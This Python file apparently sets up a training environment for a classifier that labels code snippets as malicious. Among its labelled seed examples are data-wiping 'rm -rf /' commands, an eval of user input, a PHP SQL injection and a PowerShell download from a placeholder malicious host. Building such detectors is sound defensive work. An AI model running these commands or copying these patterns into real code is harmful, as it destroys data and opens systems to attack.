"""
Environment helpers for malicious code classification task.
"""
from __future__ import annotations

import random
from typing import TypedDict, List

# Random seed for reproducibility
RANDOM_SEED: int = 42

# Training configuration for ART
TRAINING_CONFIG: dict = {
    "project": "malicious-code-classification",
    "model_name": "code-classifier-001",
    "base_model": "OpenAI/gpt-4",
    "steps": 20,
    "trajectories_per_group": 8,
    "groups_per_step": 1,
    "learning_rate": 1e-5,
    "max_completion_tokens": 64,
    "temperature": 0.7,
    "top_p": 0.9,
    "max_exceptions": 5,
    "cleanup_keep_last": 2,
}


class CodeSnippet(TypedDict):
    """
    Container for one code snippet and its label.
    """
    id: str
    code: str
    language: str
    filename: str
    label: bool  # True if malicious, False otherwise


# Seed examples covering benign utilities and common malware techniques
_SNIPPETS: List[CodeSnippet] = [
    {"id": "ex1", "code": "def add(a, b):\n    return a + b", "language": "python", "filename": "utils.py", "label": False},
    {"id": "ex2", "code": "function parseJSON(str) { return JSON.parse(str); }", "language": "javascript", "filename": "helper.js", "label": False},
    {"id": "ex3", "code": "public class HelloWorld { public static void main(String[] args) { System.out.println(\"Hello\"); } }", "language": "java", "filename": "HelloWorld.java", "label": False},
    {"id": "ex4", "code": "#!/bin/bash\necho \"Hello, world!\"", "language": "bash", "filename": "script.sh", "label": False},
    {"id": "ex5", "code": "#include <stdio.h>\nint main() { printf(\"OK\"); return 0; }", "language": "c", "filename": "main.c", "label": False},
    {"id": "ex6", "code": "package main\nimport \"fmt\"\nfunc main() { fmt.Println(\"Running server\") }", "language": "go", "filename": "server.go", "label": False},
    {"id": "ex7", "code": "import os\nos.system(\"rm -rf /\")", "language": "python", "filename": "exploit.py", "label": True},
    {"id": "ex8", "code": "const result = eval(userInput);", "language": "javascript", "filename": "attack.js", "label": True},
    {"id": "ex9", "code": "<?php $id = $_GET['id']; mysql_query(\"SELECT * FROM users WHERE id=$id\"); ?>", "language": "php", "filename": "vuln.php", "label": True},
    {"id": "ex10", "code": "#include <stdlib.h>\nint main() { system(\"rm -rf /\"); return 0; }", "language": "c", "filename": "hack.c", "label": True},
    {"id": "ex11", "code": "New-Object System.Net.WebClient).DownloadFile('http://malicious', 'file.exe')", "language": "powershell", "filename": "script.ps1", "label": True},
    {"id": "ex12", "code": "#!/usr/bin/perl\n`rm -rf /`", "language": "perl", "filename": "exploit.pl", "label": True},
]


def sample_snippet(step: int) -> CodeSnippet:
    """
    Deterministically sample one snippet based on the step.

    Args:
        step: Current training step.
    Returns:
        A CodeSnippet selected from the seed pool.
    """
    rng = random.Random(RANDOM_SEED + step)
    return rng.choice(_SNIPPETS)
